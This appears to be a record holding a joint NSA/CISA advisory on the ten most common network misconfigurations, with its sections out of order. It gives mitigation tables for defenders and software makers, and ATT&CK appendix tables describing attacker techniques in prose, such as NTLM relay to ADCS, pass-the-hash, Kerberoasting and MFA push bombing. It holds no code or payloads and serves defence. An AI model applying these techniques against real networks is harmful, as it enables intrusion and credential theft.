Use built-in functionality via Windows Hello for Business or Group Policy Objects (GPOs) to regularly re-randomize password hashes associated with smartcard-required accounts. Ensure that the hashes are changed at least as often as organizational policy requires passwords to be changed [M1027],[D3-CRO]. Prioritize upgrading any environments that cannot utilize this built-in functionality.


As a longer-term effort, implement cloud-primary authentication solution using modern open standards. See CISA’s Secure Cloud Business Applications (SCuBA) Hybrid Identity Solutions Architecture for more information.[47] Note: this document is part of CISA’s Secure Cloud Business Applications (SCuBA) project, which provides guidance for FCEB agencies to secure their cloud business application environments and to protect federal information that is created, accessed, shared, and stored in those environments. Although tailored to FCEB agencies, the project’s guidance is applicable to all organizations.[48]




Weak or misconfigured MFA methods: Lack of phishing-resistant MFA


Enforce phishing-resistant MFA universally for access to sensitive data and on as many other resources and services as possible [CPG 2.H].[3],[49]





Mitigate Insufficient ACLs on Network Shares and Services

Table 8: Recommendations for Network Defenders to Mitigate Insufficient ACLs on Network Shares and Services


Misconfiguration
Recommendations for Network Defenders




Insufficient ACLs on network shares and services


Implement secure configurations for all storage devices and network shares that grant access to authorized users only.
Apply the principal of least privilege to important information resources to reduce risk of unauthorized data access and manipulation.
Apply restrictive permissions to files and directories, and prevent adversaries from modifying ACLs [M1022],[D3-LFP].
Set restrictive permissions on files and folders containing sensitive private keys to prevent unintended access [M1022],[D3-LFP].
Enable the Windows Group Policy security setting, ""Do Not Allow Anonymous Enumeration of Security Account Manager (SAM) Accounts and Shares,"" to limit users who can enumerate network shares.





Mitigate Poor Credential Hygiene

Table 9: Recommendations for Network Defenders to Mitigate Poor Credential Hygiene


Misconfiguration
Recommendations for Network Defenders





Poor credential hygiene: easily crackable passwords
 



Follow National Institute of Standards and Technologies (NIST) guidelines when creating password policies to enforce use of “strong” passwords that cannot be cracked [M1027],[D3-SPP].[29] Consider using password managers to generate and store passwords.
Do not reuse local administrator account passwords across systems. Ensure that passwords are “strong” and unique [CPG 2.B],[M1027],[D3-SPP].
Use “strong” passphrases for private keys to make cracking resource intensive. Do not store credentials within the registry in Windows systems. Establish an organizational policy that prohibits password storage in files.
Ensure adequate password length (ideally 25+ characters) and complexity requirements for Windows service accounts and implement passwords with periodic expiration on these accounts [CPG 2.B],[M1027],[D3-SPP]. Use Managed Service Accounts, when possible, to manage service account passwords automatically.





Poor credential hygiene: cleartext password disclosure
 



Implement a review process for files and systems to look for cleartext account credentials. When credentials are found, remove, change, or encrypt them [D3-FE]. Conduct periodic scans of server machines using automated tools to determine whether sensitive data (e.g., personally identifiable information, protected health information) or credentials are stored. Weigh the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is of significant concern, technical controls, policy, and user training may prevent storage of credentials in improper locations.
Store hashed passwords using Committee on National Security Systems Policy (CNSSP)-15 and Commercial National Security Algorithm Suite (CNSA) approved algorithms.[50],[51]
Consider using group Managed Service Accounts (gMSAs) or third-party software to implement secure password-storage applications.





Mitigate Unrestricted Code Execution

Table 10: Recommendations for Network Defenders to Mitigate Unrestricted Code Execution


Misconfiguration
Recommendations for Network Defenders




Unrestricted code execution


Enable system settings that prevent the ability to run applications downloaded from untrusted sources.[52]
Use application control tools that restrict program execution by default, also known as allowlisting [D3-EAL]. Ensure that the tools examine digital signatures and other key attributes, rather than just relying on filenames, especially since malware often attempts to masquerade as common Operating System (OS) utilities [M1038]. Explicitly allow certain .exe files to run, while blocking all others by default.
Block or prevent the execution of known vulnerable drivers that adversaries may exploit to execute code in kernel mode. Validate driver block rules in audit mode to ensure stability prior to production deployment [D3-OSM].
Constrain scripting languages to prevent malicious activities, audit script logs, and restrict scripting languages that are not used in the environment [D3-SEA]. See joint Cybersecurity Information Sheet: Keeping PowerShell: Security Measures to Use and Embrace.[53]
Use read-only containers and minimal images, when possible, to prevent the running of commands.
Regularly analyze border and host-level protections, including spam-filtering capabilities, to ensure their continued effectiveness in blocking the delivery and execution of malware [D3-MA]. Assess whether HTML Application (HTA) files are used for business purposes in your environment; if HTAs are not used, remap the default program for opening them from mshta.exe to notepad.exe.





Software Manufacturers
NSA and CISA recommend software manufacturers implement the recommendations in Table 11 to reduce the prevalence of misconfigurations identified in this advisory. These mitigations align with tactics provided in joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default. NSA and CISA strongly encourage software manufacturers apply these recommendations to ensure their products are secure “out of the box” and do not require customers to spend additional resources making configuration changes, performing monitoring, and conducting routine updates to keep their systems secure.[1]

Table 11: Recommendations for Software Manufacturers to Mitigate Identified Misconfigurations


Misconfiguration
Recommendations for Software Manufacturers




Default configurations of software and applications


Embed security controls into product architecture from the start of development and throughout the entire SDLC by following best practices in NIST’s Secure Software Development Framework (SSDF), SP 800-218.[54]
Provide software with security features enabled “out of the box” and accompanied with “loosening” guides instead of hardening guides. “Loosening” guides should explain the business risk of decisions in plain, understandable language.




Default configurations of software and applications: Default credentials


Eliminate default passwords: Do not provide software with default passwords that are universally shared. To eliminate default passwords, require administrators to set a “strong” password [CPG 2.B] during installation and configuration.




Default configurations of software and applications: Default service permissions and configuration settings


Consider the user experience consequences of security settings: Each new setting increases the cognitive burden on end users and should be assessed in conjunction with the business benefit it derives. Ideally, a setting should not exist; instead, the most secure setting should be integrated into the product by default. When configuration is necessary, the default option should be broadly secure against common threats.





Improper separation of user/administrator privilege:

Excessive account privileges,
Elevated service account permissions, and
Non-essential use of elevated accounts




Design products so that the compromise of a single security control does not result in compromise of the entire system. For example, ensuring that user privileges are narrowly provisioned by default and ACLs are employed can reduce the impact of a compromised account. Also, software sandboxing techniques can quarantine a vulnerability to limit compromise of an entire application.
Automatically generate reports for:

Administrators of inactive accounts. Prompt administrators to set a maximum inactive time and automatically suspend accounts that exceed that threshold.
Administrators of accounts with administrator privileges and suggest ways to reduce privilege sprawl.


Automatically alert administrators of infrequently used services and provide recommendations for disabling them or implementing ACLs.





Insufficient internal network monitoring
 



Provide high-quality audit logs to customers at no extra charge. Audit logs are crucial for detecting and escalating potential security incidents. They are also crucial during an investigation of a suspected or confirmed security incident. Consider best practices such as providing easy integration with a security information and event management (SIEM) system with application programming interface (API) access that uses coordinated universal time (UTC), standard time zone formatting, and robust documentation techniques.




Lack of network segmentation


Ensure products are compatible with and tested in segmented network environments.




Poor patch management: Lack of regular patching


Take steps to eliminate entire classes of vulnerabilities by embedding security controls into product architecture from the start of development and throughout the SDLC by following best practices in NIST’s SSDF, SP 800-218.[54] Pay special attention to:

Following secure coding practices [SSDF PW 5.1]. Use memory-safe programming languages where possible, parametrized queries, and web template languages.
Conducting code reviews [SSDF PW 7.2, RV 1.2] against peer coding standards, checking for backdoors, malicious content, and logic flaws.
Testing code to identify vulnerabilities and verify compliance with security requirements [SSDF PW 8.2].


Ensure that published CVEs include root cause or common weakness enumeration (CWE) to enable industry-wide analysis of software security design flaws.




Poor patch management: Use of unsupported operating OSs and outdated firmware


Communicate the business risk of using unsupported OSs and firmware in plain, understandable language.




Bypass of system access controls


Provide sufficient detail in audit records to detect bypass of system controls and queries to monitor audit logs for traces of such suspicious activity (e.g., for when an essential step of an authentication or authorization flow is missing).





Weak or Misconfigured MFA Methods: Misconfigured Smart Cards or Tokens
 



Fully support MFA for all users, making MFA the default rather than an opt-in feature. Utilize threat modeling for authentication assertions and alternate credentials to examine how they could be abused to bypass MFA requirements.




Weak or Misconfigured MFA Methods: Lack of phishing-resistant MFA


Mandate MFA, ideally phishing-resistant, for privileged users and make MFA a default rather than an opt-in feature.[3]




Insufficient ACL on network shares and services


Enforce use of ACLs with default ACLs only allowing the minimum access needed, along with easy-to-use tools to regularly audit and adjust ACLs to the minimum access needed.





Poor credential hygiene: easily crackable passwords
 



Allow administrators to configure a password policy consistent with NIST’s guidelines—do not require counterproductive restrictions such as enforcing character types or the periodic rotation of passwords.[29]
Allow users to use password managers to effortlessly generate and use secure, random passwords within products.




Poor credential hygiene: cleartext password disclosure


Salt and hash passwords using a secure hashing algorithm with high computational cost to make brute force cracking more difficult.




Unrestricted code execution


Support execution controls within operating systems and applications “out of the box” by default at no extra charge for all customers, to limit malicious actors’ ability to abuse functionality or launch unusual applications without administrator or informed user approval.





VALIDATE SECURITY CONTROLS
In addition to applying mitigations, NSA and CISA recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. NSA and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 12–Table 21).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and NSA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
LEARN FROM HISTORY
The misconfigurations described above are all too common in assessments and the techniques listed are standard ones leveraged by multiple malicious actors, resulting in numerous real network compromises. Learn from the weaknesses of others and implement the mitigations above properly to protect the network, its sensitive information, and critical missions.
WORKS CITED
[1]   Joint Guide: Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default (2023), https://www.cisa.gov/sites/default/files/2023-06/principles_approaches_for_security-by-design-default_508c.pdf[2]   CISA, Known Exploited Vulnerabilities Catalog, https://www.cisa.gov/known-exploited-vulnerabilities-catalog[3]   CISA, Implementing Phishing-Resistant MFA, https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf[4]   MITRE, ATT&CK for Enterprise, https://attack.mitre.org/versions/v13/matrices/enterprise/[5]   MITRE, D3FEND, https://d3fend.mitre.org/[6]   CISA, Best Practices for MITRE ATT&CK Mapping, https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping[7]   CISA, Decider Tool, https://github.com/cisagov/Decider/[8]   CISA, Cyber Assessment Fact Sheet, https://www.cisa.gov/sites/default/files/publications/VM_Assessments_Fact_Sheet_RVA_508C.pdf[9]   Joint CSA: Weak Security Controls and Practices Routinely Exploited for Initial Access, https://media.defense.gov/2022/May/17/2002998718/-1/-1/0/CSA_WEAK_SECURITY_CONTROLS_PRACTICES_EXPLOITED_FOR_INITIAL_ACCESS.PDF[10]  Microsoft KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS), https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429[11]  Raj Chandel, Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints, https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/[12]  SpecterOps - Will Schroeder, Certified Pre-Owned, https://posts.specterops.io/certified-pre-owned-d95910965cd2[13]  CISA, CSA: CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-059a[14]  Joint CSA: Threat Actors Exploit Progress Telerik Vulnerabilities in Multiple U.S. Government IIS Servers, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a[15]  Joint CSA: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a[16]  Joint CSA: Threat Actors Exploiting Multiple CVEs Against Zimbra Collaboration Suite, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-228a[17]  Microsoft, How to verify that MS17-010 is installed, https://support.microsoft.com/en-us/topic/how-to-verify-that-ms17-010-is-installed-f55d3f13-7a9c-688c-260b-477d0ec9f2c8[18]  Microsoft, Microsoft Security Bulletin MS08-067 – Critical Vulnerability in Server Service Could Allow Remote Code Execution (958644), https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067[19]  Joint CSA: Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a[20]  CISA, Malware Analysis Report: 10365227.r1.v1, https://www.cisa.gov/sites/default/files/2023-06/mar-10365227.r1.v1.clear_.pdf[21]  Joint CSA: #StopRansomware: BianLian Ransomware Group, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a[22]  CISA Analysis Report: FiveHands Ransomware, https://www.cisa.gov/news-events/analysis-reports/ar21-126a[23]  Snaffler, https://github.com/SnaffCon/Snaffler[24]  CISA, Cross-Sector Cybersecurity Performance Goals, https://www.cisa.gov/cross-sector-cybersecurity-performance-goals[25]  Defense Information Systems Agency (DISA), Security Technical Implementation Guides (STIGs), https://public.cyber.mil/stigs/[26]  NSA, Network Infrastructure Security Guide, https://media.defense.gov/2022/Jun/15/2003018261/-1/-1/0/CTR_NSA_NETWORK_INFRASTRUCTURE_SECURITY_GUIDE_20220615.PDF[27]  NSA, Actively Manage Systems and Configurations, https://media.defense.gov/2019/Sep/09/2002180326/-1/-1/0/Actively%20Manage%20Systems%20and%20Configurations.docx%20-%20Copy.pdf[28]  NSA, Cybersecurity Advisories & Guidance, https://www.nsa.gov/cybersecurity-guidance[29]  National Institute of Standards and Technologies (NIST), NIST SP 800-63B: Digital Identity Guidelines: Authentication and Lifecycle Management, https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final[30]  Microsoft, Uninstall-AdcsWebEnrollment, https://learn.microsoft.com/en-us/powershell/module/adcsdeployment/uninstall-adcswebenrollment[31]  Microsoft, KB5021989: Extended Protection for Authentication, https://support.microsoft.com/en-au/topic/kb5021989-extended-protection-for-authentication-1b6ea84d-377b-4677-a0b8-af74efbb243f[32]  Microsoft, Network security: Restrict NTLM: NTLM authentication in this domain, https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain[33]  Microsoft, Network security: Restrict NTLM: Incoming NTLM traffic, https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic[34]  Microsoft, How to disable the Subject Alternative Name for UPN mapping, https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/disable-subject-alternative-name-upn-mapping[35]  Microsoft, Overview of Server Message Block signing, https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing[36]  Microsoft, SMB signing required by default in Windows Insider, https://aka.ms/SmbSigningRequired[37]  NSA, Defend Privileges and Accounts, https://media.defense.gov/2019/Sep/09/2002180330/-1/-1/0/Defend%20Privileges%20and%20Accounts%20-%20Copy.pdf[38]  NSA, Advancing Zero Trust Maturity Throughout the User Pillar, https://media.defense.gov/2023/Mar/14/2003178390/-1/-1/0/CSI_Zero_Trust_User_Pillar_v1.1.PDF[39]  NSA, Continuously Hunt for Network Intrusions, https://media.defense.gov/2019/Sep/09/2002180360/-1/-1/0/Continuously%20Hunt%20for%20Network%20Intrusions%20-%20Copy.pdf[40]  Joint CSI: Detect and Prevent Web Shell Malware, https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF[41]  NSA, Segment Networks and Deploy Application-aware Defenses, https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf[42]  Joint CSA: NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, https://media.defense.gov/2020/Jul/23/2002462846/-1/-1/0/OT_ADVISORY-DUAL-OFFICIAL-20200722.PDF[43]  NSA, Stop Malicious Cyber Activity Against Connected Operational Technology, https://media.defense.gov/2021/Apr/29/2002630479/-1/-1/0/CSA_STOP-MCA-AGAINST-OT_UOO13672321.PDF[44]  NSA, Performing Out-of-Band Network Management, https://media.defense.gov/2020/Sep/17/2002499616/-1/-1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF[45]  NSA, Update and Upgrade Software Immediately, https://media.defense.gov/2019/Sep/09/2002180319/-1/-1/0/Update%20and%20Upgrade%20Software%20Immediately.docx%20-%20Copy.pdf[46]  Microsoft, Microsoft Security Advisory 2871997: Update to Improve Credentials Protection and Management, https://learn.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997[47]  CISA, Secure Cloud Business Applications Hybrid Identity Solutions Architecture, https://www.cisa.gov/sites/default/files/2023-03/csso-scuba-guidance_document-hybrid_identity_solutions_architecture-2023.03.22-final.pdf[48]  CISA, Secure Cloud Business Applications (SCuBA) Project, https://www.cisa.gov/resources-tools/services/secure-cloud-business-applications-scuba-project[49]  NSA, Transition to Multi-factor Authentication, https://media.defense.gov/2019/Sep/09/2002180346/-1/-1/0/Transition%20to%20Multi-factor%20Authentication%20-%20Copy.pdf[50]  Committee on National Security Systems (CNSS), CNSS Policy 15, https://www.cnss.gov/CNSS/issuances/Policies.cfm[51]  NSA, NSA Releases Future Quantum-Resistant (QR) Algorithm Requirements for National Security Systems, https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/3148990/nsa-releases-future-quantum-resistant-qr-algorithm-requirements-for-national-se/[52]  NSA, Enforce Signed Software Execution Policies, https://media.defense.gov/2019/Sep/09/2002180334/-1/-1/0/Enforce%20Signed%20Software%20Execution%20Policies%20-%20Copy.pdf[53]  Joint CSI: Keeping PowerShell: Security Measures to Use and Embrace, https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF[54]  NIST, NIST SP 800-218: Secure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities, https://csrc.nist.gov/publications/detail/sp/800-218/final
Disclaimer of Endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Trademarks
Active Directory, Microsoft, and Windows are registered trademarks of Microsoft Corporation.MITRE ATT&CK is registered trademark and MITRE D3FEND is a trademark of The MITRE Corporation.SoftPerfect is a registered trademark of SoftPerfect Proprietary Limited Company.Telerik is a registered trademark of Progress Software Corporation.VMware is a registered trademark of VMWare, Inc.Zimbra is a registered trademark of Synacor, Inc.
Purpose
This document was developed in furtherance of the authoring cybersecurity organizations’ missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Contact
Cybersecurity Report Feedback: CybersecurityReports@nsa.govGeneral Cybersecurity Inquiries: Cybersecurity_Requests@nsa.gov Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.govMedia Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov 
Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472). When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
Appendix: MITRE ATT&CK Tactics and Techniques
See Table 12–Table 21 for all referenced threat actor tactics and techniques in this advisory.

Table 12: ATT&CK Techniques for Enterprise – Reconnaissance


Technique Title
ID
Use




Active Scanning: Vulnerability Scanning
T1595.002
Malicious actors scan victims for vulnerabilities that be exploited for initial access.


Gather Victim Host Information
T1592
Malicious actors gather information on victim client configurations and/or vulnerabilities through vulnerabilities scans and searching the web.


Gather Victim Identity Information: Credentials
T1589.001
Malicious actors find default credentials through searching the web.


Phishing for Information
T1598
Malicious actors masquerade as IT staff and convince a target user to provide their MFA code over the phone to gain access to email and other organizational resources.




Table 13: ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




External Remote Services
T1133
Malicious actors use default credentials for VPN access to internal networks.


Valid Accounts: Default Accounts
T1078.001

Malicious actors gain authenticated access to devices by finding default credentials through searching the web.
Malicious actors use default credentials for VPN access to internal networks, and default administrative credentials to gain access to web applications and databases.



Exploit Public-Facing Application
T1190
Malicious actors exploit CVEs in Telerik UI, VM Horizon, Zimbra Collaboration Suite, and other applications for initial access to victim organizations.


Phishing
T1566
Malicious actors gain initial access to systems by phishing to entice end users to download and execute malicious payloads.


Trust Relationship
T1199
Malicious actors gain access to OT networks despite prior assurance that the networks were fully air gapped, with no possible connection to the IT network, by finding special purpose, forgotten, or even accidental network connections.




Table 14: ATT&CK Techniques for Enterprise – Execution


Technique Title
ID
Use




Software Deployment Tools
T1072
Malicious actors use default or captured credentials on software deployment tools to execute code and move laterally.


User Execution
T1204
Malicious actors gain initial access to systems by phishing to entice end users to download and execute malicious payloads or to run code on their workstations.


Command and Scripting Interpreter
T1059
Malicious actors use scripting languages to obscure their actions and bypass allowlisting.


Command and Scripting Interpreter: Visual Basic
T1059.005
Malicious actors use macros for initial access, persistence, and lateral movement.




Table 15: ATT&CK Techniques for Enterprise – Persistence


Technique Title
ID
Use




Account Manipulation
T1098
Malicious actors reset built-in administrative accounts via predictable, forgotten password questions.




Table 16: ATT&CK Techniques for Enterprise – Privilege Escalation


Technique Title
ID
Use




Valid Accounts
T1078
Malicious actors analyze topical and nested Active Directory groups to find privileged accounts to target.


Valid Accounts: Domain Accounts
T1078.002
Malicious actors obtain loaded domain credentials from printers and scanners and use them to move laterally from the network device.


Exploitation for Privilege Escalation
T1068
Malicious actors load vulnerable drivers and then exploit their known vulnerabilities to execute code in the kernel with the highest level of system privileges to completely compromise the device.




Table 17: ATT&CK Techniques for Enterprise – Defense Evasion


Technique Title
ID
Use




Obfuscated Files or Information: Command Obfuscation
T1027.010
Malicious actors often use scripting languages to obscure their actions.




Table 18: ATT&CK Techniques for Enterprise – Credential Access


Technique Title
ID
Use




Adversary-in-the-Middle
T1557
Malicious actors force a device to communicate through actor-controlled systems, so they can collect information or perform additional actions.


Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
T1557.001
Malicious actors execute spoofing, poisoning, and relay techniques if Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Server Message Block (SMB) services are enabled in a network.


Brute Force: Password Cracking
T1110.002
Malicious actors capture user hashes and leverage dictionary wordlists and rulesets to extract cleartext passwords.


Credentials from Password Stores
T1555
Malicious actors gain access to and crack credentials from PFX stores, enabling elevation of privileges and lateral movement within networks.


Multi-Factor Authentication Interception
T1111
Malicious actors can obtain password hashes for accounts enabled for MFA with smart codes or tokens and use the hash via PtH techniques.


Multi-Factor Authentication Request Generation
T1621
Malicious actors use “push bombing” against non-phishing resistant MFA to induce “MFA fatigue” in victims, gaining access to MFA authentication credentials or bypassing MFA, and accessing the MFA-protected system.


Steal Application Access Token
T1528
Malicious actors can steal administrator account credentials and the authentication token generated by Active Directory when the account is logged into a compromised host.


Steal or Forge Authentication Certificates
T1649
Unauthenticated malicious actors coerce an ADCS server to authenticate to an actor-controlled server, and then relay that authentication to the web certificate enrollment application to obtain a trusted illegitimate certificate.


Steal or Forge Kerberos Tickets: Golden Ticket
T1558.001
Malicious actors who have obtained authentication certificates can use the certificate for Active Directory authentication to obtain a Kerberos TGT.


Steal or Forge Kerberos Tickets: Kerberoasting
T1558.003
Malicious actors obtain and abuse valid Kerberos TGTs to elevate privileges and laterally move throughout an organization’s network.


Unsecured Credentials: Credentials in Files
T1552.001
Malicious actors find cleartext credentials that organizations or individual users store in spreadsheets, configuration files, and other documents.




Table 19: ATT&CK Techniques for Enterprise – Discovery


Technique Title
ID
Use




Account Discovery
T1087
Malicious actors with valid domain credentials enumerate the AD to discover elevated accounts and where they are used.


File and Directory Discovery
T1083

Malicious actors use commands, such as net share, open source tools, such as SoftPerfect Network Scanner, or custom malware, such as CovalentStealer to discover and categorize files.
Malicious actors search for text files, spreadsheets, documents, and configuration files in hopes of obtaining desired information, such as cleartext passwords.



Network Share Discovery
T1135
Malicious actors use commands, such as net share, open source tools, such as SoftPerfect Network Scanner, or custom malware, such as CovalentStealer, to look for shared folders and drives.




Table 20: ATT&CK Techniques for Enterprise – Lateral Movement


Technique Title
ID
Use




Exploitation of Remote Services
T1210
Malicious actors can exploit OS and firmware vulnerabilities to gain unauthorized network access, compromise sensitive data, and disrupt operations.


Remote Services: SMB/Windows Admin Shares
T1021.002
If SMB signing is not enforced, malicious actors can use name resolution poisoning to access remote systems.


Use Alternate Authentication Material: Application Access Token
T1550.001
Malicious actors with stolen administrator account credentials and AD authentication tokens can use them to operate with elevated permissions throughout the domain.


Use Alternate Authentication Material: Pass the Hash
T1550.002
Malicious actors collect hashes in a network and authenticate as a user without having access to the user's cleartext password.




Table 21: ATT&CK Techniques for Enterprise – Collection


Technique Title
ID
Use




Data from Network Shared Drive
T1039
Malicious actors find sensitive information on network shares that could facilitate follow-on activity or provide opportunities for extortion.









This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'TA0008', 'T1021.002', 'T1558.003', 'T1550.001', 'T1098', 'TA0010', 'T1552', 'T1555', 'T1190', 'T1210', 'T1558.001', 'T1068', 'T1110.002', 'T1018', 'T1204', 'T1557', 'T1550.002', 'T1078.002', 'T1199', 'T1039', 'T1078', 'T1135', 'T1595.002', 'T1072', 'T1552.001', 'T1059.005', 'T1566', 'T1046', 'T20200', 'T1133', 'T1528', 'T1059', 'T1621', 'T1598', 'T1027.010', 'T1589.001', 'T1649', 'T1557.001', 'T1592', 'T1078.001', 'T1111', 'T1087'}","



A plea for network defenders and software manufacturers to fix common problems.
EXECUTIVE SUMMARY
The National Security Agency (NSA) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint cybersecurity advisory (CSA) to highlight the most common cybersecurity misconfigurations in large organizations, and detail the tactics, techniques, and procedures (TTPs) actors use to exploit these misconfigurations.
Through NSA and CISA Red and Blue team assessments, as well as through the activities of NSA and CISA Hunt and Incident Response teams, the agencies identified the following 10 most common network misconfigurations:

Default configurations of software and applications
Improper separation of user/administrator privilege
Insufficient internal network monitoring
Lack of network segmentation
Poor patch management
Bypass of system access controls
Weak or misconfigured multifactor authentication (MFA) methods
Insufficient access control lists (ACLs) on network shares and services
Poor credential hygiene
Unrestricted code execution

These misconfigurations illustrate (1) a trend of systemic weaknesses in many large organizations, including those with mature cyber postures, and (2) the importance of software manufacturers embracing secure-by-design principles to reduce the burden on network defenders:

Properly trained, staffed, and funded network security teams can implement the known mitigations for these weaknesses.
Software manufacturers must reduce the prevalence of these misconfigurations—thus strengthening the security posture for customers—by incorporating secure-by-design and -default principles and tactics into their software development practices.,1,

NSA and CISA encourage network defenders to implement the recommendations found within the Mitigations section of this advisory—including the following—to reduce the risk of malicious actors exploiting the identified misconfigurations.

Remove default credentials and harden configurations.
Disable unused services and implement access controls.
Update regularly and automate patching, prioritizing patching of known exploited vulnerabilities.,2,
Reduce, restrict, audit, and monitor administrative accounts and privileges.

NSA and CISA urge software manufacturers to take ownership of improving security outcomes of their customers by embracing secure-by-design and-default tactics, including:

Embedding security controls into product architecture from the start of development and throughout the entire software development lifecycle (SDLC).
Eliminating default passwords.
Providing high-quality audit logs to customers at no extra charge.
Mandating MFA, ideally phishing-resistant, for privileged users and making MFA a default rather than opt-in feature.,3,

Download the PDF version of this report: PDF, 660 KB
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13, and the MITRE D3FEND™ cybersecurity countermeasures framework.,4,5, See the Appendix: MITRE ATT&CK tactics and techniques section for tables summarizing the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques, and the Mitigations section for MITRE D3FEND countermeasures.
For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.,6,7,
Overview
Over the years, the following NSA and CISA teams have assessed the security posture of many network enclaves across the Department of Defense (DoD); Federal Civilian Executive Branch (FCEB); state, local, tribal, and territorial (SLTT) governments; and the private sector:

Depending on the needs of the assessment, NSA Defensive Network Operations (DNO) teams feature capabilities from Red Team (adversary emulation), Blue Team (strategic vulnerability assessment), Hunt (targeted hunt), and/or Tailored Mitigations (defensive countermeasure development).
CISA Vulnerability Management (VM) teams have assessed the security posture of over 1,000 network enclaves. CISA VM teams include Risk and Vulnerability Assessment (RVA) and CISA Red Team Assessments (RTA).,8, The RVA team conducts remote and onsite assessment services, including penetration testing and configuration review. RTA emulates cyber threat actors in coordination with an organization to assess the organization’s cyber detection and response capabilities.
CISA Hunt and Incident Response teams conduct proactive and reactive engagements, respectively, on organization networks to identify and detect cyber threats to U.S. infrastructure.

During these assessments, NSA and CISA identified the 10 most common network misconfigurations, which are detailed below. These misconfigurations (non-prioritized) are systemic weaknesses across many networks.
Many of the assessments were of Microsoft® Windows® and Active Directory® environments. This advisory provides details about, and mitigations for, specific issues found during these assessments, and so mostly focuses on these products. However, it should be noted that many other environments contain similar misconfigurations. Network owners and operators should examine their networks for similar misconfigurations even when running other software not specifically mentioned below.
1. Default Configurations of Software and Applications
Default configurations of systems, services, and applications can permit unauthorized access or other malicious activity. Common default configurations include:

Default credentials
Default service permissions and configurations settings

Default Credentials
Many software manufacturers release commercial off-the-shelf (COTS) network devices —which provide user access via applications or web portals—containing predefined default credentials for their built-in administrative accounts.,9, Malicious actors and assessment teams regularly abuse default credentials by:

Finding credentials with a simple web search, and using them, to gain authenticated access to a device.
Resetting built-in administrative accounts, via predictable forgotten passwords questions.
Leveraging default virtual private network (VPN) credentials for internal network access,.
Leveraging publicly available setup information to identify built-in administrative credentials for web applications and gaining access to the application and its underlying database.
Leveraging default credentials on software deployment tools, for code execution and lateral movement.

